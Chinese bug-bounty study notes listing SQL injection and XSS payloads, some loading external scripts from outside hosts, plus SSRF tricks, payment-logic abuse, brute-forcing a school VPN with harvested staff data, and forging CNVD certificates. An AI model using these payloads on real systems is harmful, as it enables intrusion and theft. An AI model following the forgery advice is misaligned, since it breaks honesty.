<h3 id="4-8-后端漏洞讲解"><a href="#4-8-后端漏洞讲解" class="headerlink" title="4.8 后端漏洞讲解"></a>4.8 后端漏洞讲解</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sql注入 xxe ssrf 相对独立 危害较高</span><br><span class="line">现在的sql注入需要大量的探测和fuzz猜参数</span><br><span class="line">sql注入绕waf</span><br><span class="line">	1.注释</span><br><span class="line">	2.四则运算</span><br><span class="line">	3.替换函数</span><br><span class="line">	4.云waf</span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#waf大多设置的是黑名单</span><br><span class="line">id<span class="operator">=</span><span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span><span class="comment">-- &#x27;</span></span><br><span class="line">id<span class="operator">=</span><span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="comment">-- &#x27;</span></span><br><span class="line">id<span class="operator">=</span><span class="string">&#x27;1&#x27;</span> <span class="operator">&amp;&amp;</span> <span class="number">1</span><span class="comment">-- &#x27;</span></span><br><span class="line">id<span class="operator">=</span><span class="string">&#x27;1&#x27;</span><span class="operator">&amp;&amp;</span><span class="number">1</span><span class="comment">-- &#x27;</span></span><br><span class="line">id<span class="operator">=</span><span class="string">&#x27;1&#x27;</span><span class="operator">||</span><span class="number">1</span><span class="comment">-- &#x27;</span></span><br><span class="line">id<span class="operator">=</span><span class="string">&#x27;1&#x27;</span> <span class="keyword">and</span> DATABASE<span class="comment">/*!(*/</span>)<span class="operator">=</span><span class="string">&#x27;test&#x27;</span><span class="comment">-- &#x27;</span></span><br><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="operator">/</span>(length(DATABASE())<span class="operator">=</span><span class="number">1</span>)    <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,....n</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> BENCHMARK(<span class="number">999999</span>,MD5(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">sleep<span class="comment">--&gt;benchmark</span></span><br><span class="line">ascii<span class="comment">--&gt;ord</span></span><br><span class="line">substr<span class="comment">--&gt;substring</span></span><br></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">基于java的xxe只能读一行数据  /etc/hostname</span><br><span class="line">xxe如果被内部实体解析xml---&gt;&gt;&gt;ssrf</span><br><span class="line">doc--&gt;&gt;docx(xml解析) xlsx</span><br><span class="line"></span><br><span class="line">表格xxe插下面的表明 每个单元格</span><br><span class="line">文档 字体能插</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">前后端分离 api----&gt;&gt;&gt;&gt;ssrf</span><br><span class="line">302 bypass</span><br><span class="line">@字符 (test.com@127.0.0.1)</span><br><span class="line">dns rebinding	在两个IP之间跳	youtube $2000</span><br><span class="line">	https://lock.cmpxchg8b.com/rebinder.html</span><br><span class="line">	靶场	https://github.com/leetCipher/bug-bounty-labs</span><br><span class="line">80分钟到dns rebinding</span><br></pre></td></tr></table></figure>

<h3 id="第五期"><a href="#第五期" class="headerlink" title="第五期"></a>第五期</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">### 5.3 vip站点分析</span><br><span class="line">### 5.6 漏洞讲解</span><br><span class="line">### 5.8 支付漏洞</span><br><span class="line">### 5.9 小程序挖掘思路</span><br></pre></td></tr></table></figure>

<h3 id="23-3-23-工具-amp-伪造cnvd"><a href="#23-3-23-工具-amp-伪造cnvd" class="headerlink" title="23_3_23 工具&amp;伪造cnvd"></a>23_3_23 工具&amp;伪造cnvd</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">burp插件</span><br><span class="line">	✔collarborator				burp自带dnslog</span><br><span class="line">	AutoRepeater</span><br><span class="line">	✔HaE 						找敏感信息 配置	</span><br><span class="line">    	替换C:\Users\hyy\.config\HaE目录下config.yml</span><br><span class="line">	✔Xia SQL					有回显盲注工具</span><br><span class="line">		加上payload语句</span><br><span class="line">	✔Link Collection 提取api</span><br><span class="line">  	✔Turbo Intruder 并发</span><br><span class="line">	子域名挖掘工具</span><br><span class="line">		bbot</span><br><span class="line">		Fuzz Domain</span><br><span class="line">	WebScan gowitness截图工具</span><br><span class="line">	cnvd伪造电信 pdf</span><br><span class="line">	看页面源码确定是否html实体化---&gt;实体化了基本没戏</span><br><span class="line">	要用chatgpt</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"># xiaSQL payload</span><br><span class="line">&#x27;%20OR%20&#x27;x&#x27;=&#x27;x</span><br><span class="line">&quot;%20OR%20&quot;x&quot;=&quot;x</span><br><span class="line">&#x27;%20OR%201=1%20--</span><br><span class="line">&quot;%20OR%201=1%20--</span><br><span class="line">&#x27;%20OR%201=1;%20--</span><br><span class="line">&quot;%20OR%201=1;%20--</span><br><span class="line">&#x27;%20OR%201=1#</span><br><span class="line">&quot;%20OR%201=1#</span><br><span class="line">&#x27;%20OR%201=1%20LIMIT%201;%20--</span><br><span class="line">&quot;%20OR%201=1%20LIMIT%201;%20--</span><br><span class="line">&#x27;%20AND%201=0;%20--</span><br><span class="line">&quot;%20AND%201=0;%20--</span><br><span class="line">&#x27;%20AND%201=1;%20--</span><br><span class="line">&quot;%20AND%201=1;%20--</span><br><span class="line">&#x27;%20AND%20SLEEP(3);%20--</span><br><span class="line">&quot;%20AND%20SLEEP(3);%20--</span><br><span class="line">&#x27;%20AND%201=BENCHMARK(1000000,MD5(&#x27;a&#x27;));%20--</span><br><span class="line">&quot;%20AND%201=BENCHMARK(1000000,MD5(&#x27;a&#x27;));%20--</span><br><span class="line">&#x27;%20UNION%20SELECT%20@@version;%20--</span><br><span class="line">&quot;%20UNION%20SELECT%20@@version;%20--</span><br><span class="line">&#x27;%20UNION%20SELECT%201,2,3,4,5;%20--</span><br><span class="line">&quot;%20UNION%20SELECT%201,2,3,4,5;%20--</span><br><span class="line">&#x27;%20AND%201/1;%20--</span><br><span class="line">&#x27;%20AND%201/0;%20--</span><br><span class="line">&quot;%20AND%201/1;%20--</span><br><span class="line">&quot;%20AND%201/0;%20--</span><br><span class="line">&#x27;%20OR%201/1;%20--</span><br><span class="line">&#x27;%20OR%201/0;%20--</span><br><span class="line">&quot;%20OR%201/1;%20--</span><br><span class="line">&quot;%20OR%201/0;%20--</span><br><span class="line">&#x27;)%20AND%201/1;%20--</span><br><span class="line">&#x27;)%20AND%201/0;%20--</span><br><span class="line">&quot;)%20AND%201/1;%20--</span><br><span class="line">&quot;)%20AND%201/0;%20--</span><br><span class="line">&#x27;)%20OR%201/1;%20--</span><br><span class="line">&#x27;)%20OR%201/0;%20--</span><br><span class="line">&quot;)%20OR%201/1;%20--</span><br><span class="line">&quot;)%20OR%201/0;%20--</span><br><span class="line">1&#x27;%20and%20sleep(5)--%20</span><br><span class="line">1&#x27;&amp;&amp;sleep(3)-- &#x27;</span><br><span class="line"></span><br><span class="line">&#x27;||case when mid(databse(),1,1)=&#x27;d&#x27; then exp(710) else 0 end||&#x27;</span><br><span class="line">||case when mid(databse(),1,1)=&#x27;d&#x27; then exp(710) else 0 end||</span><br></pre></td></tr></table></figure>

<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">✔1.每个src官网首页</span><br><span class="line">	https://www.baidu.com/more/</span><br><span class="line">	qq.com也是 把自己的业务摆出来了</span><br><span class="line">✔2.配合各种搜索引擎</span><br><span class="line">	fofa ssl 边缘资产打法</span><br><span class="line">		cert=&quot;baidu&quot; &amp;&amp; status_code=&quot;200&quot; &amp;&amp; country=&quot;CN&quot; &amp;&amp;region=&quot;Beijing&quot;</span><br><span class="line">	语雀 google 敏感信息泄露</span><br><span class="line">	小蓝鸟</span><br><span class="line">	鹰图(奇安信)</span><br><span class="line">	众测</span><br><span class="line">        小蓝本</span><br><span class="line">        360威胁情报分析小蓝本</span><br><span class="line">        Packer-Fuzz ffufs ShuiZe自动扫描</span><br><span class="line">        零零信安 小公司后台</span><br><span class="line">        边缘资产 证书透明与SAN</span><br><span class="line">	python筛选去重</span><br><span class="line">3.借助工具</span><br><span class="line">	子域名收集</span><br><span class="line">		oneforall-master	推荐</span><br><span class="line">		layer子域名挖掘机</span><br><span class="line">4.灯塔等漏洞扫描</span><br><span class="line">	灯塔的规则要自己写 别人写的都被搞完了 隐藏js接口</span><br><span class="line">5.站点配置文件</span><br><span class="line">	xxx.com/crossdomain.xml</span><br><span class="line">6.查询DNS解析记录</span><br><span class="line">	目前大多数站点已经关闭 不适用</span><br><span class="line">✔7.各种企业查</span><br><span class="line">	小蓝本</span><br><span class="line">8.某公司小程序</span><br><span class="line">	微信搜公司名</span><br><span class="line">众测端口	</span><br><span class="line">先使用各种搜索引擎收集</span><br><span class="line">	oneforall fofa google bbot 子域名挖掘机 谷歌语法 小蓝本---&gt;python数据处理</span><br><span class="line">	小程序</span><br><span class="line"></span><br><span class="line">fofa 鹰图 shadon各种api接口写一个 结合成自己的工具 python数据清理</span><br><span class="line">挖掘机--&gt;子域名	oneforall google语法 bbot</span><br><span class="line">google</span><br><span class="line">	site:http://baidu.com -www</span><br><span class="line">小蓝本 微信小程序 公众号</span><br><span class="line"></span><br><span class="line">教育众测</span><br><span class="line">	sute:xxx.edu.com 学号|工号|sfz</span><br><span class="line">	site:edu.cn 初始密码</span><br><span class="line">		4级考试系统--&gt;获取信息</span><br><span class="line">	隐藏接口 浏览器f12 查看全部接口 可能泄露更多信息</span><br><span class="line">	生成字典 登录</span><br><span class="line">	越权找老师账号 个人信息档案 教务系统</span><br><span class="line">	接口返回的信息和页面加载的信息可能不一致</span><br><span class="line">		全局搜索/api----&gt;构造接口</span><br><span class="line">	接口文件下载</span><br><span class="line">	工号 手机号 姓名生成字典--&gt;vpn</span><br></pre></td></tr></table></figure>

<h3 id="威胁情报"><a href="#威胁情报" class="headerlink" title="威胁情报"></a>威胁情报</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">伪造卖片</span><br><span class="line">	片子放在百度网盘...</span><br><span class="line">1手情报</span><br><span class="line"></span><br><span class="line">真牛论坛</span><br><span class="line">小刀娱乐网</span><br><span class="line">卡盟</span><br><span class="line"></span><br><span class="line">咸鱼	百度 百度项目	京东活动 阿里活动</span><br></pre></td></tr></table></figure>



<h3 id="半自动开发"><a href="#半自动开发" class="headerlink" title="半自动开发"></a>半自动开发</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">信息收集的过程贯穿始终</span><br><span class="line">	js逆向</span><br><span class="line">		js的signature变了大多是跟时间变了有关系</span><br><span class="line">		前端的signature的组成信息一定包含在发送的数据包中 和网页js的调用中 js加密一定可解</span><br><span class="line">	xxxcdn.test.com---&gt;cdn.test.com	cdn--&gt;静态文件加速</span><br><span class="line">	返回包302跳转改不让它跳转</span><br><span class="line">	</span><br><span class="line">burp插件参考网站</span><br><span class="line">	https://portswigger.net/burp/extender#SampleExtensions</span><br><span class="line">难点</span><br><span class="line">	1.api的调用分不清类和属性(函数)-&gt;参考案例查看所在类</span><br><span class="line">	2.图形化-&gt;https://wiki.python.org/jython/SwingExamples (jython)</span><br></pre></td></tr></table></figure>

<h3 id="功能点-视频站点"><a href="#功能点-视频站点" class="headerlink" title="功能点 视频站点"></a>功能点 视频站点</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">1.视频类站点</span><br><span class="line">	免费 付费 关注 收藏 充值vip 超前点播</span><br><span class="line">		观看历史 我的收藏--&gt;返回播放地址	</span><br><span class="line">		数据包对比</span><br><span class="line">		web换app</span><br><span class="line">		b站点和a站点来自一个数据库 </span><br><span class="line">			a要付费</span><br><span class="line">			b站点看视频免费</span><br><span class="line">			b的接口去看a--&gt;通杀</span><br><span class="line">			cdef...站点</span><br><span class="line">2.游戏娱乐站点</span><br><span class="line">3.社区服务类站点</span><br><span class="line">	评论 发表动态</span><br><span class="line">		越权 并发 xss sql注入</span><br><span class="line">4.云服务类站点</span><br><span class="line">	卖服务</span><br><span class="line">		支付</span><br><span class="line">	搭建</span><br><span class="line">		功能</span><br><span class="line">5.电商类站点</span><br><span class="line">6.金融 税务类站点</span><br><span class="line">	众测</span><br><span class="line">	</span><br><span class="line">优惠卷</span><br><span class="line">	并发 遍历新的优惠卷</span><br><span class="line">秒杀</span><br><span class="line">	改本地时间提前抢</span><br><span class="line">在线客服</span><br><span class="line">	xss</span><br><span class="line">点赞关注</span><br><span class="line">	越权</span><br><span class="line">验证码</span><br><span class="line">	改返回包试试</span><br><span class="line">用旧的cms版本</span><br><span class="line">	v3.2.0--&gt;v3.1.0</span><br><span class="line">同步</span><br><span class="line">	越权同步另一个账户的文件</span><br><span class="line">token可能是万能token</span><br><span class="line">上传文档</span><br><span class="line">	临时sts aksk</span><br><span class="line">下载 任意文件下载</span><br></pre></td></tr></table></figure>

<h3 id="并发"><a href="#并发" class="headerlink" title="并发"></a>并发</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">	竞争/并发漏洞 长属于逻辑业务中的漏洞类型，例如攻击者通过http/tcp请求达到多次获奖、多次收获、多次获赠等非正常逻辑所能触发的效果。</span><br><span class="line">	多线程 用一时间执行多于一个线程。</span><br><span class="line">	关系型数据库中，允许多个用户同时访问和更改共享数据的进程。SQL Server使用锁定以允许多个用户同时访问和更改共享数据而彼此之间不发生冲突。</span><br><span class="line">	</span><br><span class="line">	领取优惠卷时同时发送10次请求 服务器全都当成第一次的请求。</span><br><span class="line">	余额提现 并发</span><br><span class="line">	抽奖	怎么一直成为新用户 注销注册/换绑</span><br><span class="line">		新注册用户 仅限一次</span><br><span class="line">	转盘抽奖</span><br><span class="line">	点赞并发(低危)</span><br><span class="line">		微博抖音点赞高危代表热度高</span><br><span class="line">	粉丝并发(高危)</span><br><span class="line">		未鉴权</span><br><span class="line">			cookie 返回内容</span><br><span class="line">		抓取消关注 粉丝变成0</span><br><span class="line">		obj参数 callback参数 返回包对比</span><br><span class="line">	并发越权</span><br><span class="line">		有可能是条件竞争</span><br><span class="line">		低权限使用高权限功能</span><br><span class="line">	文件上传 条件竞争绕waf	xss并发绕waf</span><br><span class="line">*/</span><br><span class="line">/*</span><br><span class="line">	判断服务器需要反应时间</span><br><span class="line">    场景</span><br><span class="line">	</span><br><span class="line">	点赞 提现</span><br><span class="line">	签到--&gt;尽量能搞到钱 提升危害</span><br><span class="line">	</span><br><span class="line">	万物皆可并发！！</span><br><span class="line">	</span><br><span class="line">	普通并发不能给高危-&gt;拓展危害</span><br><span class="line">	</span><br><span class="line">	send to intruder --&gt;&gt; extensions -&gt; send to turbo intruder</span><br><span class="line">		example/race.py</span><br><span class="line">	</span><br><span class="line">	积分抽奖想中什么中什么 -&gt;伪造sign</span><br><span class="line">	</span><br><span class="line">	并发越权</span><br><span class="line">		抓出接口 低权限并发执行高权限功能</span><br><span class="line">		条件竞争过waf</span><br><span class="line">			并发xss</span><br><span class="line">	</span><br><span class="line">	新人福利</span><br><span class="line">		换绑</span><br><span class="line">		注销注册</span><br><span class="line">	</span><br><span class="line">	优惠卷</span><br><span class="line">		并发</span><br><span class="line">		id规律 是否可以遍历处隐藏优惠卷</span><br><span class="line">		面额是否可以改</span><br><span class="line">		</span><br><span class="line">	接码平台，是指专门提供手机号为他人接收来自第三方平台验证码并将验证码提供给他人的资源平台</span><br><span class="line">	出高危</span><br><span class="line">*/</span><br><span class="line">爆破设置10秒(临界点)发一个包		(各个厂商接收的时间间隔不同)</span><br></pre></td></tr></table></figure>

<h3 id="支付漏洞"><a href="#支付漏洞" class="headerlink" title="支付漏洞"></a>支付漏洞</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">	服务器过分信任客户端 信息从客户端获取 导致漏洞</span><br><span class="line">	服务器未进行数据效验，数据库采用常规的int,float等，而没有采用无符号数</span><br><span class="line">	采用本地时间效验服务器时间</span><br><span class="line">	</span><br><span class="line">	支付三个步骤</span><br><span class="line">	1.选择物品下单</span><br><span class="line">	2.提交订单*(核心出问题的简短)</span><br><span class="line">	3.到达支付</span><br><span class="line">	</span><br><span class="line">	属性 总价、单价、数量、账号、余额、优惠、订单ID、时间天数</span><br><span class="line">	</span><br><span class="line">	如何实现0元购？</span><br><span class="line">	</span><br><span class="line">	sign加密几乎不可能成功</span><br><span class="line">	如果服务端过分信任客户端 那就把客户端所有交互都改一遍</span><br><span class="line">	单价</span><br><span class="line">	小金额商品买大金额商品 连带sign加密整体替换</span><br><span class="line">	</span><br><span class="line">	最大整数溢出</span><br><span class="line">	服务器限制了负数 超过则发生溢出 变为0</span><br><span class="line">	int -2147483648~2147483647</span><br><span class="line">	即2147483649=-2147483647</span><br><span class="line">	</span><br><span class="line">	云服务中常出现时间这个点</span><br><span class="line">	</span><br><span class="line">	数字换成字符串试试</span><br><span class="line">	</span><br><span class="line">	修改本地时间达到永久vip服务 签到时间</span><br><span class="line">	</span><br><span class="line">	加入购物车环节</span><br><span class="line">        value/count 1----&gt;&gt;&gt;&gt;0.00000000001g	1kb等于0.000001g</span><br><span class="line">        </span><br><span class="line">    优惠卷叠加</span><br><span class="line">*/</span><br></pre></td></tr></table></figure>



<h3 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line">数据交互的地方</span><br><span class="line">    get post cookies headers</span><br><span class="line">    反馈与浏览</span><br><span class="line">    富文本编辑器</span><br><span class="line">    各类标签插入和自定义</span><br><span class="line">数据输出的地方</span><br><span class="line">    用户资料</span><br><span class="line">    关键词 标签 说明</span><br><span class="line">    文件上传</span><br><span class="line">payload</span><br><span class="line">    &lt;script src=http://xxx.com/xss.js&gt;&lt;/script&gt;		引入外部js</span><br><span class="line">    &lt;img src=1 onerror=alert(/hack/)&gt;	对于数字可以不用引号</span><br><span class="line">    &lt;img src=&quot;javascript:alert(1)&quot;&gt;</span><br><span class="line">    &lt;img dynsrc=&quot;javascript:alert(1)&quot;&gt;</span><br><span class="line">    &lt;img lowsrc=&quot;javascript:alert(1)&quot;&gt;</span><br><span class="line">    &lt;body onload=alert(1)&gt;</span><br><span class="line">    &lt;body background=&quot;javascript:alert(1)&quot;&gt;</span><br><span class="line">    &lt;iframe srcdoc=&quot;&lt;img src onerror=...&quot;&gt;&lt;/iframe&gt;</span><br><span class="line"></span><br><span class="line">前端登录跳转 location</span><br><span class="line">    ../login?url(redirect_url)=...---&gt;javascript:alert(1)</span><br><span class="line">    	没有成功可能是正则表达式拦截了</span><br><span class="line">    	javascript://%0aalert(1)</span><br><span class="line">    	javascript://test.com/%0aalert(1)	#域名</span><br><span class="line">    </span><br><span class="line">    xss平台	https://xss.pt/xss.php?do=login</span><br><span class="line"></span><br><span class="line">    前端调试 断点</span><br><span class="line"></span><br><span class="line">    第二种		script标签里面</span><br><span class="line">        &lt;script&gt;var a = &#x27;&#x27;-alert(1)//test&#x27;&lt;/script&gt;</span><br><span class="line">        &lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">            window.nickName = &#x27;&#x27;;var s=document.createElement(&#x27;script&#x27;);document.body.appendChild(s);s.src=&#x27;https://m0qq.com/poc.js&#x27;;//&#x27;;</span><br><span class="line">        &lt;/script&gt;</span><br><span class="line"></span><br><span class="line">    文本编辑器字体写xss</span><br><span class="line"></span><br><span class="line">	xss:带出cookie 打破同源策略(共享cookie)</span><br><span class="line">	xss cors csrf相辅相成浏览器触发，用户与用户之间的攻击 无关服务器</span><br><span class="line">	同源策略 xss获取a.test.com的cookie--&gt;&gt;b.test.com的cookie---&gt;核心是执行js</span><br><span class="line">	json传参设计同源策略 不允许json传 json同源cookie过不来?????</span><br><span class="line">	</span><br><span class="line">	